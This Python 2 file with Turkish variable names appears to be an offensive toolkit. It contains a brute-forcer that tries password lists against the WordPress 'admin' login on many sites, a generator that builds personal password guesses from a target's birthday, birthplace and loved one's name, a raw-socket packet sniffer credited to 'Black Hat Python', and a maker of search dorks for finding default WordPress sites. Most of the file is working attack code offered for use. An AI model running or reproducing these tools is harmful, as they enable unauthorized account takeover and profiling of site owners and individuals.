from ctypes import *
import urllib2, urllib, cookielib
import random
import os
import struct
import socket

class WTF_EXCEPTION(Exception):
    pass
class BFAttack():
    def run(self, site, password):
        self.sifreler = open(password, "r").readlines()
        self.urller = open(site, "r").readlines()
        for i in self.urller:
            i = i.strip()
            for sifre in self.sifreler:
                self.ayar  = {"log":"admin","pwd":sifre}
                self.cj = cookielib.CookieJar()
                self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj))
                self.opener.addheaders = [('User-agent','Mozilla/5.0 \
                    (compatible; MSIE 6.0; Windows NT 5.1)')]
                data = urllib.urlencode(self.ayar)
                try:
                    text = self.opener.open(i, data, 10).read()
                    if "Dashboard" in text:
                        print "[+]" + i + ":" + sifre
                except:
                    print "[-]"
                    pass
class WordList():
    def make(self, sev="", dogum="", ugurlu_sayi="", dog_yer="", ozel_tarih="", isim=""):
        self.f = open('password.txt', 'w+')
        self.bilgiler = [sev, dogum, ugurlu_sayi, dog_yer, ozel_tarih, isim]
        self.sayi = ['1234567890']
        self.bilgiler+=self.sayi
        self.passw=[]
        for d in self.bilgiler:
            self.passw.append(d.lower())

        for d in self.bilgiler:
            for d2 in self.bilgiler:
                self.passw.append(d.lower()+d2.lower())
                self.passw.append(d.lower()+"."+d2.lower())
        for d in self.bilgiler:
            for d2 in self.bilgiler:
                for d3 in self.bilgiler:
                    self.passw.append(d.lower()+d2.lower()+d3.lower())
                    self.passw.append(d.lower()+"."+d2.lower()+"."+d3.lower())
        self.f.write("\n".join(self.passw))
        self.f.close()
            
        print("[+] Over.")
class IP(Structure):
    host = "192.168.0.30"
    _fields_ = [         
        ("ihl", c_ubyte, 4),
        ("version", c_ubyte, 4),
        ("tos", c_ubyte),
        ("len", c_ushort),
        ("id", c_ushort),
        ("offset", c_ushort),
        ("ttl", c_ubyte),
        ("protocol_num", c_ubyte),
        ("sum", c_ushort),
        ("src", c_ulong),
        ("dst", c_ulong)
    ]
         
    def __new__(self, socket_buffer=None):
             
        return self.from_buffer_copy(socket_buffer)
    def __init__(self, socket_buffer=None):
        self.protocol_map = {1:"ICMP", 6:"TCP", 17:"UDP"}

        self.src_address = socket.inet_ntoa(struct.pack("<L",self.src))
        self.dst_address = socket.inet_ntoa(struct.pack("<L",self.dst))

        try:
            self.protocol = self.protocol_map[self.protocol_num]
        except:
            self.protocol = str(self.protocol_num)
class Sniff():#Black Hat Python PDF
    
    def run(self):
        host = socket.gethostbyname(socket.gethostname())
        if os.name == "nt":
            socket_protocol = socket.IPPROTO_IP
        else:
            socket_protocol = socket.IPPROTO_ICMP
        sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
        sniffer.bind((host, 0))
        sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        if os.name == "nt":
            sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
        try:
            while True:
                raw_buffer = sniffer.recvfrom(65565)[0]
                ip_header = IP(raw_buffer[0:20])

                print "Protocol: %s %s -> %s" % (ip_header.protocol, ip_header.src_address, ip_header.dst_address)
        except KeyboardInterrupt:

            if os.name == "nt":
                sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)

        
        
class DorkMake():
    def run(self,num):
        self.liste = urllib2.urlopen("https://svnweb.freebsd.org/csrg/share/dict/words?view=co&content-type=text/plain")
        self.satir = self.liste.readlines()
        self.dorks = ['("Comment on Hello world!")', '("author/admin")', '("uncategorized")', '("Just another WordPress site")', '("/wp/hello-world/")', '("uncategorized/hello-world")']
        for i in range(num):
            for dork in self.dorks:
                k = random.choice(self.satir)
                print dork+k
        

